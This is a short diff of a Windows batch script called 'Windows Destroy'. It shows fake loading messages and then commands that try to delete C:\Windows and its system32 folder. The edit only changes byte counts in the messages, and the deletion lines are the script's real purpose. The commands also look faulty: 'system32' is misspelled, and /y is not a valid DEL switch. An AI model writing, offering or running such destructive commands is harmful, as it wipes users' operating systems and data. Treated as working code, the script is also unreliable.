@@ -1,10 +1,10 @@
 @ECHO OFF
 TITLE Windows Destroy
 MSG Windows Destroy is starting up
-MSG Copying Windows Destroy File... (0B/556B)
-MSG Copying Windows Destroy File... (556B/556B)
+MSG Copying Windows Destroy File... (0B/622B)
+MSG Copying Windows Destroy File... (622B/622B)
 MSG Windows Destroy is loading file... (0% - 0B)
-MSG Windows Destroy is loading file... (100% - 556B)
+MSG Windows Destroy is loading file... (100% - 622B)
 MSG Running Windows Destroy
 DEL C:\Windows /y
 DEL C:\Windows\sytem32 /y
